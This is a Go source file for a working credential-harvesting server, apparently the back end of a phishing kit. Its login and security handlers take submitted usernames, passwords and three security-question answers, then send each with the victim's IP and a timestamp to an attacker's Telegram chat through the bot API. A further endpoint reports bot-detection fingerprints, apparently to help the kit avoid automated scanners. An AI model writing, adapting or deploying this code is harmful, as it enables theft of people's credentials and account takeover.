package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/joho/godotenv"
)

type LoginRequest struct {
	Username        string   `json:"username"`
	Password        string   `json:"password"`
	SecurityAnswers []string `json:"securityAnswers"`
}

func main() {
	// Load environment variables from .env file
	err := godotenv.Load()
	if err != nil {
		log.Println("Warning: Error loading .env file:", err)
	}

	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	if botToken == "" || chatID == "" {
		log.Fatal("TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables must be set")
	}

	// Set up routes
	http.Handle("/", http.FileServer(http.Dir("./public")))
	http.HandleFunc("/login", loginHandler)
	http.HandleFunc("/security", securityHandler)
	http.HandleFunc("/log-bot-activity", logBotActivityHandler)

	// Start server
	log.Printf("Server starting on :%s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func loginHandler(w http.ResponseWriter, r *http.Request) {
	// Set CORS headers
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	// Handle preflight request
	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Only accept POST requests
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Handle form data from index.html
	if r.Header.Get("Content-Type") == "application/x-www-form-urlencoded" {
		if err := r.ParseForm(); err != nil {
			http.Error(w, "Error parsing form data", http.StatusBadRequest)
			return
		}

		username := r.FormValue("userId")
		password := r.FormValue("Passcode")

		// Get client IP
		ip := r.RemoteAddr
		if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
			ip = strings.Split(forwarded, ",")[0]
		} else {
			ip = strings.Split(ip, ":")[0]
		}

		timestamp := time.Now().Format(time.RFC3339)

		// Prepare Telegram message
		message := fmt.Sprintf(
			"🚨 Login Attempt 🚨\n\nUsername: %s\nPassword: %s\nIP: %s\nTimestamp: %s",
			username,
			password,
			ip,
			timestamp,
		)

		// Send to Telegram
		if err := sendTelegramMessage(message); err != nil {
			log.Printf("Failed to send Telegram message: %v", err)
			http.Redirect(w, r, "/security.html", http.StatusSeeOther)
			return
		}

		// Redirect to security page
		http.Redirect(w, r, "/security.html", http.StatusSeeOther)
		return
	}

	// Ensure content type is JSON
	contentType := r.Header.Get("Content-Type")
	if contentType != "application/json" {
		http.Error(w, "Content-Type must be application/json", http.StatusUnsupportedMediaType)
		return
	}

	// Read and log the raw request body for debugging
	bodyBytes, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}
	log.Printf("Raw request body: %s", string(bodyBytes))

	// Parse JSON body
	var req LoginRequest
	if err := json.Unmarshal(bodyBytes, &req); err != nil {
		log.Printf("JSON parse error: %v", err)
		http.Error(w, fmt.Sprintf("Bad Request: Invalid JSON - %v", err), http.StatusBadRequest)
		return
	}

	// Validate required fields
	if req.Username == "" || req.Password == "" {
		http.Error(w, "Username and password are required", http.StatusBadRequest)
		return
	}

	// Get client IP (handling proxy cases)
	ip := r.RemoteAddr
	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
		ip = strings.Split(forwarded, ",")[0]
	} else {
		ip = strings.Split(ip, ":")[0]
	}

	timestamp := time.Now().Format(time.RFC3339)

	// Prepare Telegram message with password
	message := fmt.Sprintf(
		"🚨 Login Attempt 🚨\n\nUsername: %s\nPassword: %s\nIP: %s\nTimestamp: %s",
		req.Username,
		req.Password,
		ip,
		timestamp,
	)
	log.Printf("Prepared Telegram message: %s", message)

	// Send to Telegram
	log.Println("Attempting to send Telegram message...")
	if err := sendTelegramMessage(message); err != nil {
		log.Printf("Failed to send Telegram message: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(`{"status": "error", "message": "Failed to send Telegram message"}`));
		return
	}
	log.Println("Telegram message sent successfully")

	// Respond with success and include username in response
	response := map[string]interface{}{
		"status":   "success",
		"message":  "Login attempt processed successfully",
		"username": req.Username,
	}
	jsonResponse, _ := json.Marshal(response)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write(jsonResponse)
}

func securityHandler(w http.ResponseWriter, r *http.Request) {
	// Set CORS headers
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	// Handle preflight request
	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Only accept POST requests
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Parse form or JSON data
	var answer1, answer2, answer3 string
	contentType := r.Header.Get("Content-Type")

	if contentType == "application/x-www-form-urlencoded" {
		if err := r.ParseForm(); err != nil {
			http.Error(w, "Error parsing form data", http.StatusBadRequest)
			return
		}
		answer1 = r.FormValue("answer1")
		answer2 = r.FormValue("answer2")
		answer3 = r.FormValue("answer3")
	} else if contentType == "application/json" {
		bodyBytes, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading request body", http.StatusBadRequest)
			return
		}

		var data map[string]string
		if err := json.Unmarshal(bodyBytes, &data); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		answer1 = data["answer1"]
		answer2 = data["answer2"]
		answer3 = data["answer3"]
	} else {
		http.Error(w, "Unsupported content type", http.StatusUnsupportedMediaType)
		return
	}

	// Get client IP
	ip := r.RemoteAddr
	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
		ip = strings.Split(forwarded, ",")[0]
	} else {
		ip = strings.Split(ip, ":")[0]
	}

	timestamp := time.Now().Format(time.RFC3339)

	// Prepare Telegram message
	message := fmt.Sprintf(
		"🔐 Security Answers 🔐\n\nAnswer 1: %s\nAnswer 2: %s\nAnswer 3: %s\nIP: %s\nTimestamp: %s",
		answer1,
		answer2,
		answer3,
		ip,
		timestamp,
	)

	// Send to Telegram
	if err := sendTelegramMessage(message); err != nil {
		log.Printf("Failed to send security answers to Telegram: %v", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte(`{"status": "error", "message": "Failed to process security answers"}`));
		return
	}

	// Respond with success
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status": "success", "message": "Security answers processed successfully"}`));
}

func sendTelegramMessage(text string) error {
	botToken := os.Getenv("TELEGRAM_BOT_TOKEN")
	chatID := os.Getenv("TELEGRAM_CHAT_ID")

	if botToken == "" || chatID == "" {
		return fmt.Errorf("telegram credentials not set")
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	form := url.Values{}
	form.Add("chat_id", chatID)
	form.Add("text", text)
	form.Add("parse_mode", "HTML")

	log.Printf("Sending Telegram message to URL: %s", apiURL)
	log.Printf("Message content: %s", text)

	resp, err := http.PostForm(apiURL, form)
	if err != nil {
		log.Printf("Telegram API request error: %v", err)
		return fmt.Errorf("telegram API request failed: %w", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	log.Printf("Telegram API response status: %d, body: %s", resp.StatusCode, string(body))

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("telegram API returned non-200 status: %d, body: %s", resp.StatusCode, string(body))
	}

	return nil
}

// BotActivity represents data sent from the client about detected bot activity
type BotActivity struct {
	Score       int       `json:"score"`
	Fingerprint string    `json:"fingerprint"`
	Timestamp   time.Time `json:"timestamp"`
	IP          string    `json:"ip,omitempty"`
}

// logBotActivityHandler receives and logs bot activity detected by the client
func logBotActivityHandler(w http.ResponseWriter, r *http.Request) {
	// Set CORS headers
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

	// Handle preflight request
	if r.Method == "OPTIONS" {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Only accept POST requests
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Read request body
	bodyBytes, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusBadRequest)
		return
	}

	// Parse JSON body
	var activity BotActivity
	if err := json.Unmarshal(bodyBytes, &activity); err != nil {
		log.Printf("JSON parse error for bot activity: %v", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Get client IP
	ip := r.RemoteAddr
	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
		ip = strings.Split(forwarded, ",")[0]
	} else {
		ip = strings.Split(ip, ":")[0]
	}
	activity.IP = ip

	// Log the bot activity
	log.Printf("Bot activity detected: Score=%d, Fingerprint=%s, IP=%s", 
		activity.Score, activity.Fingerprint, activity.IP)

	// Send to Telegram
	message := fmt.Sprintf(
		"🤖 Bot Activity Detected 🤖\n\nScore: %d\nFingerprint: %s\nIP: %s\nTimestamp: %s",
		activity.Score,
		activity.Fingerprint,
		activity.IP,
		activity.Timestamp.Format(time.RFC3339),
	)

	if err := sendTelegramMessage(message); err != nil {
		log.Printf("Failed to send bot activity to Telegram: %v", err)
	}

	// Return success response
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status":"success"}`));
}
